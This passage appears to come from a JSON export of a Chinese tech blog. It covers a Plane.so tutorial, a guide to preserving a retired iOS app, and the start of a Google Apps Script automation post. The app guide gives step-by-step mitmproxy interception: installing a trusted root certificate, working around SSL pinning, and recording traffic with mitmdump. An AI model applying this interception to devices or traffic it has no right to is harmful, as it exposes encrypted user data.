的多維度彈性但 Plane 由以下框架組成，供專案管理使用： Issues：同 Asana Task，任何工作都開成 Issue 再安排處理或是當成留紀錄。 Cycles：類似 Sprint，一個迭代的時間週期或是版本，每個 Issue 只能存在在一個 Cycle。 Modules：專案、模組、分類功能，每個 Issue 可加入多個 Modules。 Layouts &amp; Views：可以使用 甘特圖、行事曆、看板、列表、Sheet 模式檢視 Issues，也可以將篩選條件、顯示方式儲存為 View 方便快速檢視。 Inbox：Issue Proposed 流程，可建立提案 Issue，審核通過才會真的建立 Issue 到專案中執行，不通過則直接 Pages：簡易文檔功能，可以記錄一些工作、產品事項。 Drive：類似 Google Drive 團隊檔案功能。目前免費版、CE (Self-Hosted)版 均無此功能。Plane.so 操作教學我們可以快速、免費直接的開始使用 Plane Cloud 版本：Plane | Simple, extensible, open-source project management tool. Open-source project management tool to manage issues, sprints, and product roadmaps with peace of mind. app.plane.soWorkspace 首次進入 Plane.so 會需要我們建立首個 Workspace Workspace 同 Asana 工作區域，一隻帳號可以加入多個 Workspaces 如果是小型公司跨團隊使用可以在同個 Workspace 如果是大公司跨團隊，Plane 沒有如 Asana 的 Team 功能、Project 分組功能；在同個 Workspace 會導致 Projects 混亂，建議直接改成用 Workspace 區分團隊創建完成後可在 Workspace 下拉選單上切換不同 Workspace，也可由此進入 Workspace Settings:設定有： General Workspace 大頭貼、名稱、網址 Billing and plans 付費資訊、升級方案 Integrations 第三方整合，目前免費版僅提供 Github, Slack 整合 Imports 匯入功能，目前僅提供 Jira, Github Project 匯入 Exports 匯出功能，目前僅提供 csv, excel, json 格式匯出 Webhooks API tokens，自行串接 API比較重要的設定是 Members，我們需要邀請團隊成員加入 Workspace:身份別： Guest/Viewer 目前功能上無太大區別，僅能檢視 Issue、Comment、Emoji；如果是不同組織信箱外的外部使用者則為 Guest，同個組織則為 Viewer Member 可操作所有功能 Admin 可進入 SettingsHome 首頁 Home 整個 Workspace 所有 Projects, 成員狀態 Anaytics 所有成員, Issues 分析 Projects 所有 Projects All Issues 所有 Projects 的 Issues Active Cycles 所有 Projects 當前 Cycle 狀態 Notifications Issues 通知Projects進入 Projects 查看所有公開、已加入的 Projects: Project 名稱、簡介、封面圖、前綴 (Issue Alias e.g. APP-1 ) Project 權限：Public 所有加入 Workspace 的成員都能查看、加入；Private 只有受邀的成員能加入 Lead：Project 主要負責人Project 右上角「…」可進行： Add to favorites， Pin 到 我的最愛 (Your Projects 上方) Publish 產生公開對外連結，如同官方 Roadmap Project Draft Issues 查看已儲存的草稿 Issues Archives 查看被封存的 Issues其他設定： General：專案一般設定 Members：專案成員、專案權限 States：專案 Issue 狀態 (後面會介紹) Labels：專案 Labels 管理 Features：可控制要啟用哪些功能(預設不啟用 Inbox 功能) Estimates：專案估時欄位設定 (後面會介紹) Integrations：第三方整合 (Workspace 要先啟用) Automations：目前免費版僅支援超過 X 時間就自動把 Closed Issues 封存、超過 X 時間自動 Close 未完成的 IssuesIssues 進入後可由左方 Projects 建立 Project 不同於 Asana，Plane 的 Issue 只能加入一個 Project 右上角可切換顯示方式 預設會展開所有 Sub-Issues，如果覺得很雜可以到 Display -&gt; 取消 Show sub-Issues點擊「Create Issue」開始建立 Issue： 可儲存成草稿 Issues 支援文字樣式、Code Block 支援 Markdown 支援文繞圖，可直接拖曳圖片上傳 支援多位 Assignees (這點比 Asana 方便，Asana 只支援一個 Task 一位 Assignee) 選擇 Priority，不同 Priority 有不同高亮樣式 (目前無法客製化 Priority) 選擇 Modules，可以加入多個 Modules，例如： 登入優化 , App …(設定稍後介紹) 選擇 Cycle，要在哪個 Sprint 做，只能選一個，例如： W22 , S22 , 2024–05 …(設定稍後介紹) 目前不支援自訂 Issue Property 選擇 Add parent，將此 Issue 作為 Sub-Issue 加入到 Parent Issue 選擇 Labels (a.k.a Tag 功能) 選擇 Start Date, Due Date… (目前不支援到準確時間、不支援 Repeated Issue) 選擇 Estimate (a.k.a Scrum story point 或預計投入的資源)，Estimate 可在 Settings 中調整、新增；不過目前限制只能啟用一個 Estimate 欄位並且 Estimate Value 只能設定 6 個。(官方 Roadmap 寫 2024Q2 會改進此功能) 選擇 Issue State，State 可在 Settings 中調整、新增：使用 AI 建立 Issue 內容： 可以點擊建立旁邊的 AI 按鈕輸入 Prompt 自動產出預設 Issue 內容，點擊 Use this response 套用到 Issue Description。Issue 創建好之後，在列表點擊會出現 Issue Preview 視窗，可以點展開進入 Issue Full-Screen 頁面：點擊展開進入 Issue Full Screen Deatil 頁： 圖片預覽，可拖移或右鍵開新視窗放大 (目前無法點擊放大) 可點擊新增 Sub-Issue (Sub-Issues 目前不支援排序、Section 功能) 新增表情符號 (目前只有 👍👎😀💥😕✈️👀 七種表情符號) 上傳附加檔案 (不限於是圖片，但是圖片目前無預覽功能，需點擊查看) 留言討論區域 (目前中文選自會自動送出，請參考文末解決方案) 可訂閱/取消訂閱此 Issue 改變通知 Relates to 可加入關聯的 Issues Blocking 可標記正在被此 Issue 阻擋執行的 Issue (目前無特殊功能) Blocked by 可標記正在阻擋此 Issue 執行的 Issue (目前無特殊功能) Duplicate of 標記重複的 Issue (目前無特殊功能) Labels 可快速標記、創建標記 Linkes 相關連結，可加入 Figam, Google Doc 之類的外部連結 刪除、封存 IssueCycle 週期 首頁會顯示當前 Cycle 與其執行狀況、燃盡圖 還有即將到來的 Cycle、已完成的 Cycle 目前需要手動建立 Cycle 例如每兩週一個 Sprint 就要建立 SXX 然後指定時間週期 Cycle 時間週期無法重複 Cycle 時間週期不能選擇過去時間 Issue 只能加入一個 Cycle 點擊進入可查看 Cycle 細節，上方可以使用不同顯示方式、Filter 查看 Issues 右方有燃盡圖、執行狀況 可依照 Assignees, Labels, States 查看 IssuesModules 模組 可以把 Modules 當成專案彙整、OKR 目標、職能分類(Design, FE, BE, App. . ) 來使用 可設定專案 Lead &amp; Members 專案進度與 Issue State 不同，多了 Planned, Paused 狀態 可設定日期範圍 點擊進入可查看 Module 細節，上方可以使用不同顯示方式、Filter 查看 Issues 右方有燃盡圖、執行狀況 可依照 Assignees, Labels, States 查看 Issues 可為 Module 加上 LinkViews 可為常用的篩選條件、檢視模式建立 View，可以直接從此快速查看。 View 上方一樣可以使用不同顯示方式、Filter 查看 IssuesPages 簡易文檔 Pages 提供所見即所得的文檔編輯器，可以很容易的撰寫文檔、插入圖片 目前暫不支援目錄、分類功能，文檔一多會很混亂 文檔權限：Public 所有 Project 成員可見、Private 僅自己可見。Notifications Issues 個人通知功能 訂閱的 Issues 之狀態、內容更改、新留言都會有通知 預設自己建立的、被 Assign 的、Lead 的專案的 Issues 都會訂閱 目前無 Slack 、第三方通知目前僅能透過 Email 通知： 從大頭貼 -&gt; Settings -&gt; Preferences -&gt; Email 可打開 Email 通知Dark Mode 從大頭貼 -&gt; Settings -&gt; Preferences -&gt; Theme 可選擇 Plane 主題官方手冊Plane Documentation - Plane Plane is an extensible, open source project and product management tool. It allows users to start with a basic task… docs.plane.so其他操作、使用細節可參考官方文件。⚠️⚠️聲明⚠️⚠️ 以上是 2024–05–25 v0.20-Dev 版的使用介紹，官方仍如火如荼開發新功能與優化使用者體驗，上述功能限制在未來都可能已改善，請以最新版的體驗為主。開發中專案難免有 Bug、體驗問題，請大家多給 Plane.so 團隊一點耐心；有任何問題也歡迎到下方回報： 問題回報： https://github.com/makeplane/plane/issues 官方 Discord： https://discord.com/invite/A92xrEGCgePlane.so x Scrum 工作流程範例架構 每個團隊有自己的 Workspace 每個團隊會有一個主要的產品 Project Projects：其他可建立如行銷廣告 Project、客服支援 Project 或與外部合作的 Project，與產品主要開發 Project 分開 Modules：建立 Function Modules (設計, 前端, 後端, App) 方便 Team Lead 追蹤、將 OKR 或專案目標建立 Module (提升轉換率、OKR-1 提升 GMV…) Cycle：依照 Sprint 週期建立 Cycle，假設是每週一個 Sprint 可建立 W12 or 照週一日期來建立 2024–05–27 因目前無法自動建立 Cycle，因此需每月或每週先建立好未來的 Cycle 有什麼工作都要開 Issue Issue 可以的話加上 Start Date &amp; Due Date、Modules、Priority 如過一個 Issue 一直在 In-Progress &amp; Cycle 中切換(一個 Cycle 做不完)，可評估是否把 Issue 拆細，方便專案管理流程 Sprint 週期：一週 Backlog：有什麼工作、發想都開 Issue，State = Backlog、 填寫 Estimate、Priority 每週一 Sprint Planning Meeting：從 Backlog 挑選 Issues 與正在執行的 Issues (To Do or In progress)、設定 Priority/Estimate，安排本次 Sprint 執行，加入到 Cycle 中 Sprint 中如果有插單執行的 Issue 也需要直接開在本週 Cycle Daily Stand-up：每日早上花 15 分鐘快速各自分享 Issue 執行狀況 Issue 準備執行、開始執行 更改狀態成 ToDo/In Progress Issue 完成更改狀態成 Done，或是多建立一個 Review State 每週五 Sprint Review Meeting：單純 Review 本週 Issues (不是 Planning 下週)，已完成的 Issue 快速回顧，並確保有填寫 Estimate 方便日後統計。 每週五盡量確保 Cycle 內所有 Issue 都是完成的， 未完成的 Issue 選擇加入下一週的 Cycle 或轉 Pending/Cancel 。 持續迭代以上流程，管理所有 Issues、Projects⚠️⚠️聲明⚠️⚠️ 以上只是工作流程範例，請注意沒有完美的流程，只有適合您團隊的流程；請參考 Plane.so 提供的架構發揮創意找到最佳的專案管理方式。附錄APIPlane.so 是很乾淨的前後分離架構，因此有很完整的 API 可以使用，從 Workspace Settings 建立 API Tokens 後就能帶入 API Request Header X-API-Key 就能使用，API Endpoint 請求方式可參考官方 API 文件 。 但因官方文件尚未完善，很多請求方式並沒有列在文件中，最快的方式就是打開瀏覽器工具查看 Network 請求，去看官方如何請求 API 的，套上自己的 Key 就能使用。Issue 評論，輸入中文時選完字就直接送出問題開了 Issue 給官方＆追了一下 Source Code，感覺修復機會蠻低的，因為一開始就沒考慮會需要選自的語言，因此直接綁定鍵盤 Enter Event 送出 Comment。Browser Extension Workaround：這邊提供一個自己寫的 Workaround JavaScript 腳本，去 Hook Enter 事件。1.首先先安裝 JavaScript 瀏覽器注入外掛：以上是 Chromium 共用的套件，其他瀏覽器也可以搜尋類似的 JavaScript Inject 注入工具。2.回到 Plane.so 上點擊擴充套件 -&gt; 點擊「+」3.將以下 JavaScript 注入到 Plane.sodocument.addEventListener('keydown', function(event) { if (event.key === 'Enter' || event.keyCode === 13) { // event.keyCode is for older browsers const focusedElement = document.activeElement; const targetButtons = focusedElement.parentElement.parentElement.parentElement.parentElement.parentElement.querySelectorAll('button[type=\"submit\"]'); if (targetButtons.length &gt; 0 &amp;&amp; targetButtons[0].textContent.trim().toLowerCase() === \"comment\") { console.log(\"HIT\"); // Focus the active element and place the cursor at the end focusedElement.focus(); if (window.getSelection) { var range = document.createRange(); var selection = window.getSelection(); range.selectNodeContents(focusedElement); range.collapse(false); selection.removeAllRanges(); selection.addRange(range); } event.stopImmediatePropagation(); } }},true); 貼上程式碼後，按「Save」儲存。回到 Plane.so (重整) 打開一個 Issue 測試 Comment 功能。 按 Enter 選字已不會自動送出了，按空白 + Shift Enter 可換行，手動點 Comment 送出評論。⚠️⚠️⚠️資安問題⚠️⚠️⚠️ 因 Plane.so 還處於開發階段產品也很新，不確定是否有安全資安問題，建議不要上傳任何敏感資料，以免服務有重大問題時造成資料外洩，或使用 Self-Hosted 自架僅供本地內網使用。Plane Self-Hosted 自架教學 Plane.so Docker Self-Hosted 自架紀錄有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,116 Total Views Last Statistics Date: 2025-01-19 | 1,107 Views on Medium. " }, { "title": "App 產品進入終點站，能做什麼事緬懷？", "url": "/posts/b04f4fba3cf2/", "categories": "ZRealm Dev.", "tags": "ios-app-development, man-in-the-middle-attack, mitmproxy, python, app-development", "date": "2024-05-15 00:20:45 +0800", "snippet": "App 產品進入終點站，能做什麼事緬懷？使用 mitmproxy + apple configurator 讓 App 永遠停留在下架前的狀態前言咒術迴戰工作時間久、經手過的產品多，也開始遇到有曾經參與過的產品要進入終點站(下架)；從零到有開發一個產品如同孕育一個新生命，團隊一起努力了 3–4 個月將孩子生下來；雖然後期已交由其他保母(工程師)繼續培養，最近聽到它即將進入產品生命週期的終點還...", "content": "App 產品進入終點站，能做什麼事緬懷？使用 mitmproxy + apple configurator 讓 App 永遠停留在下架前的狀態前言咒術迴戰工作時間久、經手過的產品多，也開始遇到有曾經參與過的產品要進入終點站(下架)；從零到有開發一個產品如同孕育一個新生命，團隊一起努力了 3–4 個月將孩子生下來；雖然後期已交由其他保母(工程師)繼續培養，最近聽到它即將進入產品生命週期的終點還是有些許遺憾。 人生也是如此，我們永遠都不知道明天是太陽先升起還是意外先來臨；唯一能做的就是珍惜當下，把事情做好。緬懷凡走過必留下痕跡，我們希望能在產品進入終點站之前做些什麼，讓大家還有機會回憶也讓它至少留下存在過的證明；以下方式都需要 App 還在線上，如果已經下架就真的只剩回憶了。非技術方式 — 錄影除了直接用 iPhone 內建的螢幕錄影功能 之外，我們也可以使用 QuickTime Player 將手機接上 Mac 使用電腦進行錄影、匯出影片。 在 Mac 上打開 QuickTime Player App2. 左上角工具列選擇「檔案」-&gt;「新增影片錄製」3. 跳出錄影介面後點擊 🔴 旁的「v」，螢幕與揚聲器選擇您接上的手機4. 此時錄影介面就會出現手機畫面點擊「🔴」開始錄影，回到手機上操作要錄影的內容。錄影中會顯示當前影片大小，欲結束錄影再按一次「🔴」即可停止。可以透過 QuickTime Player 工具列簡單的裁剪影片，最後按下「Command」+「s」匯出儲存影片到指定位置，即完成錄影留念。影片留念的好處是未來回憶比圖片更容易串連起來，錄的越深就紀錄的越仔細，若要將更別畫面轉成圖片也可以直接截圖，很方便。技術方式App 技術備份可分為兩個方向；「骨」App 本身其實只是個骨架、「肉」由 API Response Data 組成才是 App 內容資料的核心。 骨會隨著 App 從 App Store 商城下架而消失。 肉會隨著 API 主機、伺服器關閉而消失。因此我們也分成備份骨跟肉兩個技術方式。聲明 本文僅為技術研究分享，不鼓勵利用任何技術進行非法、侵權行為。[骨] 備份 .ipa App 安裝檔App 在商城下架後已下載 App 的手機只要不主動刪除 App，就會一直存在在該手機上，換手機用轉移的方式也會一併轉移過去。但如果我們不小心刪除該 App 或是換手機沒轉移，那就真的永遠跟他說再見了；此時如果有手動備份商城的 .ipa 檔案就能再次續命。很久以前 逆向工程的文章 有提到過，但這次只需單純備份 .ipa 檔案不需敲殼，全部都是使用 Apple 官方提供的工具完成。1.安裝 Apple Configurator 2首先去 Mac App Store 下載安裝「 Apple Configurator 2 」2. 將 iPhone 接上 Mac 並點擊信任電腦接上成功後就會出現 iPhone 的主畫面。3. 確認你的手機已安裝欲備份 .ipa 檔案的 App我們需要在 Apple Configurator 2 卡出取代畫面，才能取得下載到暫存中的 .ipa 檔案，因此我們要先確保手機上有安裝目標 App。4. 回到 Mac 上的 Apple Configurator 2點兩下上面顯示的 iPhone 主畫面進入資訊頁。切換到「App」-&gt; 右上角「+ 加入」-&gt;「App」完成 App Store 帳號登入後可以取得您曾經購買過的 App 列表。搜尋找到欲備份的目標 App，選擇後點「加入」。此時會出現等待視窗，正在 XXX 上加入 App、正在下載「XXX」。5. 提取 .ipa 檔案 放著等他下載完成後，會跳出詢問是否要取代現有已安裝 App 視窗。 此時不要按任何動作。此時不要按任何動作。此時不要按任何動作。我們打開一個 Finder：左上角工具列選擇「前往」-&gt; 「前往檔案夾」貼上以下路徑：~/Library/Group Containers/K36BKF7T3D.group.com.apple.configurator/Library/Caches/Assets/TemporaryItems/MobileApps就可以找到下載下來正準備要安裝的目標 App .ipa 檔案：將其複製出來即可完成 App .ipa 檔案備份。完成檔案複製後再回去 Apple Configurator 2 點擊停止，終止操作。[骨] 還原 .ipa App 安裝檔一樣是將欲還原 App 的手機接上 Mac 並打開 Apple Configurator 2，進入 App 加入介面。還原的話要選擇左下角「從我的 Mac 選擇…」選擇備份的 App .ipa 檔案，按「加入」。等待傳送、安裝完成，回到手機上就能重新打開 App，復活成功！[肉] 備份最後的 API Response Data這邊會運用到之前在 App End-to-End Testing Local Snapshot API Mock Server 文章(細節原理可參考) 中所使用到的方式跟當時弄的開源專案：同之前用錄製 API Request &amp; Response 來跑 E2E Testing 的技術，我們也可以用它來紀錄 App 下架、停機前最後的 API Request &amp; Response Data。1. 安裝 mitmproxybrew install mitmproxymitmproxy 是一套開源的中間人攻擊，網路請求嗅探工具。如果你不熟悉 Mitmproxy 中間人攻擊的工作原理可先參考我之前的文章：「 APP有用HTTPS傳輸，但資料還是被偷了。 」或 Mimproxy 官方文件 。如果是用在純網路請求嗅探，用不習慣 mimproxy 介面也可以改用「 Proxyman 」可參考之前 另一篇文章 的用法。2. 完成 mitmproxy 憑證設定 針對 HTTPS 加密連線我們需要使用根憑證抽換進行中間人攻擊，因此第一次使用須先完成手機端根憑證下載與啟用。 *如果您的 App &amp; API Server 有實作 SSL Pinning 也需要將 Pinning 憑證加入到 mitmproxy。 首先確保 iPhone 手機與 Mac 電腦是連接在相同的網路環境 若無 WiFi 電腦連接實體網路，也可以 打開 Mac 的 WiFi 分享功能 讓手機連到 Mac 的網路在 Terminal 啟動 mitmproxy or mitmweb (Web GUI 版)。mitmproxy看到這畫面代表 mitmproxy 服務已啟動，目前沒有流量進來所以是空的，掛在這個畫面不要關閉 Terminal。 到 Mac 網路設定查看 Mac 的 IP 位址回到手機 WiFi 設定點擊「i」進入詳細設定，找到最下方「設定代理伺服器」： 伺服器輸入 Mac 電腦的 IP 位址 連接埠輸入 8080 儲存在手機上打開 Safari 輸入： http://mitm.it/如果出現：If you can see this, traffic is not passing through mitmproxy.代表手機的網路代理伺服器沒有設定成功或是 Mac 上沒啟動 mitmproxy 。正常情況會出現： 此時只有 HTTP 流量能被嗅探，HTTPS 流量會報錯，我們繼續往下設定。代表連接成功，我們找到 iOS 區塊點擊「Get mimproxy-ca-cert.pem」 點擊「允許」下載完成後進入到手機的設定，會出現「已下載描述檔」點擊進入。 點擊進入，右上角「安裝」，輸入手機密碼完成安裝。回到設定 -&gt; 「一般」-&gt;「關於本機」-&gt; 最下方「憑證信任設定」-&gt; 啟用「mitmproxy」。 「繼續」完成啟用。至此我們就完成中間人攻擊所有的前置準備工作。 要記得當前你手機所有的流量都會經過代理從你的 Mac 電腦出去， 操作完畢記得回到手機上的網路設定把代理伺服器設定關掉 ，否則手機網路 WiFi 會全部連不上對外網路。回到 Terminal mitmproxy，一邊操做手機上的 App 就能看到所有被捕捉的 API 請求紀錄。每個請求都能進入查看詳細 Request &amp; Response 內容：以上是 mitmproxy 基礎設定與實際工作。3. 嗅探、了解 API 架構再來就要透過 mitmproxy 的 mitmdump 服務結合我之前開發的 mitmproxy-rodo addons 錄製請求和回放請求。 我的實現原理 是將 Request 請求參數計算成 Hash 值，在回放時再次將請求拿去計算 Hash 如果在本地有找到相同 Hash 值的備份 Response 則返回，如果有多個相同 Hash 值的請求會按照順序儲存＆回放。我們可以先透過以上方法嗅探 App 的 API (或使用 Proxyman )，觀察有哪些欄位跟哪些欄位可能會影響 Hash Mapping，可以將其記錄下來，在後續設定排除， 例如有的 API 固定會帶 ?ts 這參數不影響回傳內容，但會影響 Hash 值計算導致無法找到本地的備份，我們就需要挑出來在後面的設定中排除掉 。4.設定 mitmproxy-rodo :使用我寫好的錄製、回放開源 Script。 細節參數設定請參考該開源專案的說明。git clone git@github.com:ZhgChgLi/mitmproxy-rodo.gitcd mitmproxy-rodo將上一步驟 3. 挑出來的參數填入到 config.json 設定檔案中：{ \"ignored\": { \"*\": { \"*\": { \"*\": { \"iterable\": false, \"enables\": [ \"query\", \"formData\" ], \"rules\": { \"query\": { \"parameters\": [ \"ts\", \"connect_id\", \"device_id\", \"device_name\", ] }, \"formData\": { \"parameters\": [ \"aidck\", \"device_id\", \"ver_name\", ] } } } } } }}以上參數在計算 Hash 值時都會被排除，也能針對個別 Endpoint 路徑設定特定排除規則。5. 啟用錄製，在 Terminal 下改執行：mitmdump -s rodo.py --set dumper_folder=zhgchgli --set config_file=config.json --set record=true \"~d zhgchg.li\" 結尾的 \"~d zhgchg.li\" 意思是只截取 * .zhgchg.li 的流量。 dumper_folder : 輸出目的目錄名稱6. 回到手機上操作目標 App 執行欲錄製的流程路徑 建議重啟、重安裝 App 用最乾淨的方式開始操作 建議可以搭配錄影，以利記得復現步驟邊操作的同時，就能看到輸出目錄會有很多擷取下來的 API Response Data，會照著 Domain -&gt; API 路徑 -&gt; HTTP 方法 -&gt; Hash 值 -&gt; Header-X / Content-X 存放(若相同 Hash 請求兩次，會按照順序儲存下來)。 重新錄製可以直接刪出輸出目錄，讓他重新擷取。 如果回傳的資料包含個資，請記得調整擷取內容去識別化。[肉] 回放擷取到的 API Response Data錄製完畢後請務必要嘗試回放一次，測試資料是否正常，若 Hash Hit 很低(回放時幾乎都沒找到對應的 Response)，可以重複嗅探步驟找到那個每次執行 App 都不確定影響 Hash 值的變數並將其排除。執行回放：mitmdump -s rodo.py --set dumper_folder=zhgchgli --set config_file=config.json dumper_folder : 輸出目的目錄名稱 預設本地沒有 Hash Mapping 到的 Response Data 會直接回傳 404 讓 App 空白，這樣才能知道擷取的資料有沒有效。 錄製擷取時有經過過的路徑頁面，回放時能重新顯示：OK! 錄製擷取時沒經過過的路徑頁面，回放時顯示網路錯誤：OK!緬懷至此，我們已經可以自行透過還原骨與最後的肉，來復現當年 App 走進終點站前的最後時光，以此緬懷那個大家一起同心協力生產出來的時光。以此篇文章紀念第一份工作的團隊與當年從網頁後端開發邊做邊學轉職 iOS App 開發，獨立從無到有在 3–4 個月的短暫時間，與 Android、設計、PM 主管、後端同事一同順利生產出的產品，雖然它即將進入生命週期的終點站，但我永遠都會記得當年的酸甜苦辣與第一次看到他上線、有人使用的那個感動。 「謝謝」歡迎協助貢獻如果你也有相同的遺憾，希望本篇文章也能幫助到你，因為 mitmproxy-rodo 當初只是 POC 概念驗證下開發出的工具，歡迎協助貢獻、提出遇到的 Bug 或開 PR 修改 Bug。有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 297 Total Views Last Statistics Date: 2025-01-19 | 288 Views on Medium. " }, { "title": "使用 Google Apps Script 實現每日數據報表 RPA 自動化", "url": "/posts/f6713ba3fee3/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, roboticprocessautomation, rpa-solutions, google-apps-script, google-sheets", "date": "2024-04-14 23:16:45 +0800", "snippet": "使用 Google Apps Script 實現每日數據報表 RPA 自動化使用 Google Apps Script 進行 Google Workspace 相關服務之 Robotic Process Automation 自動化Photo by Possessed PhotographyRobotic Process AutomationRPA (Robotic Process Auto...", "content": "使用 Google Apps Script 實現每日數據報表 RPA 自動化使用 Google Apps Script 進行 Google Workspace 相關服務之 Robotic Process Automation 自動化Photo by Possessed PhotographyRobotic Process AutomationRPA (Robotic Process Automation) 中文翻譯為「流程自動化機器人」回顧人類發展歷史，從徒手採集到石器時代再到農耕文明，從上個世紀的工業革命開始到近 20 年的資訊崛起，人類的工作效率與產能有了指數級的飛躍成長；這一路上無處不在 RPA 應用的身影，農耕時期的水車(自動化脫穀工作)、工業革命的紡織機(自動化紡織工作)、工廠機械手臂(自動化組裝工作)，最後是本篇要介紹的，自動化資訊相關工作，例如：自動查詢報表、自動通知…等等工作。說來慚愧，我也是最近才知道這個名詞，打從從第一份工作開始 (7 年前)，就一直有在做 RPA 的事，諸如撰寫爬蟲統計數據、自動化 CI/CD 流程、自動化查詢數據、自動化穩定性數據告警、自動化每日例行操作…等等；不過以往我都以「自動化」三個字作為代稱，是時候給他一個正名了 — RPA (Robotic Process Automation)。之前所做的 RPA 更多只關注在「動手寫程式實現自動化工作解決單一問題」上 ，少了前期的完整評估與分析、No/Low Code 工具使用、法規、運行監控、實際數據統計、持續改進、企業文化推廣…等等，這都是完整的 RPA 需要做的事；不過如同前面所說，我也是最近才知道這個專業領域，就容我還是先以實作方面水一篇文章吧！提供 RPA 服務的平台有很多，例如 Automation Anywhere,UiPath, Microsoft Power Automate, Blue Prism 或是 Zapier, IFTTT, Automate.io …要依照實際想解決的問題與平台挑選適合的服務。推薦一套免費開源基於瀏覽器的 RPA Tool: Automa 。 另外廣義來說，將人與人或人與事的主動依賴轉化成人對平台、事對平台的依賴也是一種 RPA。 例如：統一使用 Asana/Jira…等專案管理工具統一管理工作事項。 基於主動轉被動的理念，原本需要人工上去檢查有無新通知的服務，我們也可以實現一個 RPA，當有新變動時自動通知我們。 例如：之前實現過的 Gmail to Slack 將特定通知信件轉發到工作群組。Robotic Process Automation 的效益評估之前在「 2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密 」分享過積少成多及心流中斷的成本問題；假設一件例行重複性的工作，每次需要花費 15 分鐘解決，每週會發生 10 次，一年下來就浪費將近 130 小時；如果再算上「心流切換」成本，最終可能浪費近 200 小時一年。2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密 心流切換的意思是，當我們專注在重要的事情上做得正 High! 時，需要暫停去處理其他事情，處理完畢再回來重新進入狀態所耗費的時間。開發 RPA 的效益評估可參考下圖，只要開發所需時間跟遇到的頻率大於所浪費的時間，就值得投入資源實現：https://twitter.com/swyx/status/1196401158744502272 X 軸：任務發生頻率 ex: 50/Day (50次一天) Y 軸：任務每次需花費多少人力時間才能完成 耗費時間 Range 抓 5 年來算，表格中間表示 5 年下來浪費的時間人力成本 白色為可能投入做自動化的時間成本大於能得到的效益，不值得改善 綠色表示值得自動化的項目 紅色為強烈建議轉為自動化 除了節省時間之外，自動的制式化流程也能減少人工出錯機率，提升穩定性。Robotic Process Automation 跟 AI 的關係隨著 AI 興起，RPA 也經常被提及；但我覺得 RPA 與 AI 並無直接關係， 沒有 AI 的年代早就有 RPA，企業導入 AI 的幫助可能還沒有完善 RPA 的效益來得高，RPA 更多的還是企業文化、工作習慣的問題 ；不過不可否認 AI 確實能幫助 RPA 邁向下一個層次，例如以往 RPA 只能做確切、例行的工作，有了 AI 就能做一些模糊的、較動態的、智能判斷的工作。Robotic Process Automation at Google WorkspaceGoogle Workspace (舊稱 G Suite)，是我們日常辦公協作的好夥伴，信箱使用 Gmail 託管、文件放在 Google Doc、報表使用 Google Sheet、表單使用 Google Form…等等，這些服務之間的串接或是與內外部系統的溝通，都需要我們實現 RPA 來完成。但 Google 並沒有提供直接的 RPA 服務，可以透過以下幾個服務達成： No Code： App Sheet (付費服務)，讓非開發人員直接透過 GUI 搭建服務串接自動化。 Low Code： Google Apps Script (免費服務)，簡單撰寫程式就能快速直接的橋接 Google 服務、外部/內部系統。 Function as a Service： Cloud Functions (付費服務，提供免費額度)，撰寫完整程式碼、服務，透過 Google Cloud 部署直接執行。No Code 平台 App Sheet 我沒接觸過， Cloud Functions 與 Google Apps Script 算蠻有經驗的，以下是一些個人之前的使用與選擇經驗分享：Cloud Functions 需部署執行 支援使用多種程式語言撰寫：Node.js, Python, Java, Go, PHP, Ruby… 支援第三方套件依賴管理、安裝並使用 支援完整身份驗證機制 最多執行時間上限： 60 分鐘 用多少算多少：依照次數、執行時間、不同處理器、使用的記憶體收費 受限冷啟動問題(太久沒呼叫，再次呼叫，第一次會需要較長響應時間) 無法直接串接 Google 服務，需要走 Auth/API 驗證 免費方案如下 Cloud Functions 針對運算時間資源提供永久免費方案，當中包括 GB/秒和 GHz/秒的分配方式。除了 200 萬次叫用以外，這個免費方案也提供 400,000 GB/秒和 200,000 GHz/秒的運算時間，以及每月 5 GB 的網際網路資料傳輸量。免費方案的使用額度，是以上述級別 1 價格的同等美元金額計算。無論執行函式的區域採用的是級別 1 和/或級別 2 價格，系統都會分配同等美元金額給您。不過在扣除免費方案的額度時，系統將以函式執行區域的級別 (級別 1 或級別 2) 為準。請注意，即便您採用的是免費方案，也必須擁有有效的帳單帳戶。總結來說，Cloud Functions 可以提供較完整與複雜的 RPA 串接功能或是有較多的外部 API 串接需求時比較建議使用 Cloud Functions。之前使用過 Cloud Functions 的案例有： [Slack ChatGPT 對話機器人]： Slack &amp; ChatGPT Integration [自動簽到機器人]： 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事都是與非 Google Workspace 服務整合且須橋接其他外部服務時我會使用。Google Apps Script 方便簡單快速 完全免費 串接服務無需繁瑣複雜的 Auth 身份驗證(Google Apps Script 是直接使用當前執行的帳號做為執行身份) 內建排程、行事曆觸發器功能 使用 Google 網路執行網路請求 只能使用 Google Apps Script (基於 JavaScript) 的語言開發 不支援套件管理工具、無版控功能 基於安全問題， 無法客製化 Request User-Agent 資訊 執行時間上限，腳本必須在 6 分鐘內完成工作，否則會被終止。 其他限制與配額請參考官方的 GAS 資訊 ：之前使用過 Google Apps Script 的案例有： [串接 Slack x Google Form x Google Sheet]： Slack 打造全自動 WFH 員工健康狀況回報系統 [串接 Slack x Gmail]： 運用 Google Apps Script 轉發 Gmail 信件到 Slack [串接 Google Analytics x Slack]： Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate [串接 Firebase Crashlytics x Big Query x Slack]： Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 [串接 Github x LineBot]： 使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier受限於執行時間與 API Request 客製化限制，只有簡單快速的服務我會使用 Google Apps Script 達成；或是需要與 Google 服務串接的需求，我會優先選擇使用 Google Apps Script (因為用 Cloud Functions 要多實現完整的 Google 服務身份驗證流程)。Robotic Process Automation with Google Apps Script — 工作日報表 (Google Sheet x Google Analytics)終於來到本篇的主題，使用 Google Apps Script 實現 Google 服務 RPA 自動化。背景產品團隊需要每日查詢 Google Analytics 數據並填寫到 Google Sheet 數據報表上，共團隊分析趨勢使用；並將每日數據內容發佈到 Dashboard 螢幕上，讓所有成員掌握目前狀況。同事每日一到公司就要花大約 30 